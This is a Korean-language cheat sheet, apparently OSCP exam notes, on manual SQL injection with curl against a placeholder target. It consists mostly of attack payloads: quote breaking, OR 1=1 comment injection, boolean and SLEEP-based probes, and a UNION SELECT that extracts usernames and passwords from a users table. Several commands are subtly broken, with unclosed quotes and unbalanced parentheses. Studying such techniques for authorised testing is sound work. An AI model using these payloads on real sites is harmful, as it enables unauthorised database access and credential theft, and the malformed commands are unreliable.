# curl_sql_inject

- curl 한 줄 요청으로 `'` 탈출·`OR 1=1--` 주석·`SLEEP()` 시간 기반·UNION SELECT를 직접 날려 SQL 인젝션을 수동 판별·수행하는 기법
- sqlmap 같은 자동 도구를 못 쓰는 환경(OSCP 시험 등)에서 인젝션 후보 파라미터를 빠르게 검증하고, Boolean 차이 → 시간 차이 → UNION 추출 순으로 수동 진행할 때
- 파라미터 값이 SQL 문자열 컨텍스트에 그대로 삽입되어야 하고, 응답 본문·에러·응답 시간 차이를 관찰할 수 있어야 한다. UNION은 컬럼 수를 `ORDER BY n` 등으로 맞춰야 한다

## 개요

`curl`로 SQL 주입을 수동 테스트한다. OSCP에서는 sqlmap 같은 자동 툴 사용이 제한될 수 있으므로, 수동 기법을 익혀야 한다.

## GET/POST 공격 기본

```bash
# GET 파라미터
curl "http://target/page.php?id=1'

# 주석으로 나머지 쿼리 제거
curl "http://target/page.php?id=' OR 1=1--
curl "http://target/page.php?id=' OR 1=1' --
```

- `' OR 1=1--`: SQL 주석(`--`)으로 나머지 쿼리를 주석 처리한다.
- 홀따옴표(`'`)로 문자열을 끊는다. 따옴표를 못 끊으면 쿼리가 깨지 않는다.

## 응답 분석 (수동 판별)

```bash
curl "http://target/page.php?id=' AND 1=1--"
curl "http://target/page.php?id=' AND 1=2--"
```

두 응답이 다르면(예: 에러 vs 무에러) SQL 주입이 있다.

## 시간 기반 공격

```bash
http://target/page.php?id=(SELECT IF(1, SLEEP(5), 0)))
http://target/page.php?id=(SELECT IF(0, SLEEP(5), 1)))
```

- 첫 요청이 5초 이상 걸리면, `SLEEP()`로 응답 시간을 확인한 것이다.
- 두 번째 요청이 빠르면 조건이 거짓이다(1=0).

## UNION 공격

```bash
http://target/page.php?id=1 UNION SELECT null, username, password FROM users--
```

- 두 번째 SELECT의 컬럼 수를 맞춰야 한다.
- 결과에 DB 사용자/비밀번호가 보이면 크리덴셜 확보의 출발점이 된다.

## 주의

- UNION은 컬럼 수를 정확히 맞춰야 한다. 하나씩 맞춰가며 시도한다.
- DB의 `information_schema`에서 테이블/컬럼을 조회한다.
